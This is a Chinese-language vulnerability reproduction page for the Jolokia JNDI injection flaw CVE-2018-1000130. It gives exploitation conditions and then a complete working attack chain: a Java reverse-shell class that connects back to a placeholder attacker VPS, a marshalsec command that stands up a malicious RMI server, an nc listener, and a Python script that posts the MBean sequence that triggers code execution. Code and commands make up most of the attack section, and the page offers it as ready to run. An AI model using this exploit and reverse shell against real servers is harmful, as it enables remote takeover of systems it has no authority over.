<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-1000130）Jolokia 远程代码执行漏洞</h1><h2>一、漏洞简介</h2><p>Jolokia服务的代理模式默认情况下在1.5.0版之前容易受到<strong>JNDI注入</strong>的攻击。当以代理模式部署Jolokia代理时，有权访问Jolokia Web端点的外部攻击者可以通过JNDI注入攻击远程执行任意代码。由于Jolokia库使用用户提供的输入启动LDAP / RMI连接，因此有可能造成这种攻击。</p><h4><em>利用条件：</em></h4><ul><li>目标网站存在 /jolokia 或 /actuator/jolokia 接口</li><li>目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>实际测试 RMI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121</li></ul><h2>二、漏洞影响</h2><p>Jolokia &lt; 1.50</p><h2>三、复现过程</h2><h4><em>漏洞分析</em></h4><ol class="pydocx-list-style-type-decimal"><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li></ol><h3>漏洞复现</h3><h5>步骤一：查看已存在的 MBeans</h5><p>访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。</p><h5>步骤二：准备要执行的 Java 代码</h5><p>需要修改脚本里对应的反弹shell的ip和端口</p><p>/**<br /> *  javac -source 1.5 -target 1.5 JNDIObject.java<br /> *<br /> *  Build By LandGrey<br /> * */<br /><br />import java.io.File;<br />import java.io.InputStream;<br />import java.io.OutputStream;<br />import java.net.Socket;<br /><br />public class JNDIObject {<br />    static {<br />        try{<br />            String ip = "your-vps-ip";<br />            String port = "443";<br />            String py_path = null;<br />            String[] cmd;<br />            if (!System.getProperty("os.name").toLowerCase().contains("windows")) {<br />                String[] py_envs = new String[]{"/bin/python", "/bin/python3", "/usr/bin/python", "/usr/bin/python3", "/usr/local/bin/python", "/usr/local/bin/python3"};<br />                for(int i = 0; i &lt; py_envs.length; ++i) {<br />                    String py = py_envs[i];<br />                    if ((new File(py)).exists()) {<br />                        py_path = py;<br />                        break;<br />                    }<br />                }<br />                if (py_path != null) {<br />                    if ((new File("/bin/bash")).exists()) {<br />                        cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/bash\")"};<br />                    } else {<br />                        cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/sh\")"};<br />                    }<br />                } else {<br />                    if ((new File("/bin/bash")).exists()) {<br />                        cmd = new String[]{"/bin/bash"};<br />                    } else {<br />                        cmd = new String[]{"/bin/sh"};<br />                    }<br />                }<br />            } else {<br />                cmd = new String[]{"cmd.exe"};<br />            }<br />            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();<br />            Socket s = new Socket(ip, Integer.parseInt(port));<br />            InputStream pi = p.getInputStream();<br />            InputStream pe = p.getErrorStream();<br />            InputStream si = s.getInputStream();<br />            OutputStream po = p.getOutputStream();<br />            OutputStream so = s.getOutputStream();<br />            while(!s.isClosed()) {<br />                while(pi.available() &gt; 0) {<br />                    so.write(pi.read());<br />                }<br />                while(pe.available() &gt; 0) {<br />                    so.write(pe.read());<br />                }<br />                while(si.available() &gt; 0) {<br />                    po.write(si.read());<br />                }<br />                so.flush();<br />                po.flush();<br />                Thread.sleep(50L);<br />                try {<br />                    p.exitValue();<br />                    break;<br />                } catch (Exception e) {<br />                }<br />            }<br />            p.destroy();<br />            s.close();<br />        }catch (Throwable e){<br />            e.printStackTrace();<br />        }<br />    }<br />}</p><h5>步骤三：架设恶意 rmi 服务</h5><p>https://github.com/ianxtianxt/marshalsec</p><p>使用下面命令架设对应的 rmi 服务：</p><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389</p><h5>步骤四：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><p>nc -lvp 上面java脚本里面自己设置的端口</p><h5>步骤五：发送恶意 payload</h5><p>根据实际情况修改 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><p>#!/usr/bin/env python3<br /># coding: utf-8<br /># Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt<br /><br /><br />import requests<br /><br /><br />url = 'http://127.0.0.1:8080/jolokia'<br /><br /><br />create_realm = {<br />    "mbean": "Tomcat:type=MBeanFactory",<br />    "type": "EXEC",<br />    "operation": "createJNDIRealm",<br />    "arguments": ["Tomcat:type=Engine"]<br />}<br /><br />wirte_factory = {<br />    "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />    "type": "WRITE",<br />    "attribute": "contextFactory",<br />    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"<br />}<br /><br />write_url = {<br />    "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />    "type": "WRITE",<br />    "attribute": "connectionURL",<br />    "value": "rmi://your-vps-ip:1389/JNDIObject"<br />}<br /><br />stop = {<br />    "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />    "type": "EXEC",<br />    "operation": "stop",<br />    "arguments": []<br />}<br /><br />start = {<br />    "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />    "type": "EXEC",<br />    "operation": "start",<br />    "arguments": []<br />}<br /><br />flow = [create_realm, wirte_factory, write_url, stop, start]<br /><br />for i in flow:<br />    print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))<br />    r = requests.post(url, json=i)<br />    r.json()<br />    print(r.status_code)</p></body></html>